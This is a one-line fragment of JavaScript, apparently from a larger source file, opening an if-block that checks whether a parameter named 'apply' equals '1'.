   if (params.get('apply') === '1') {
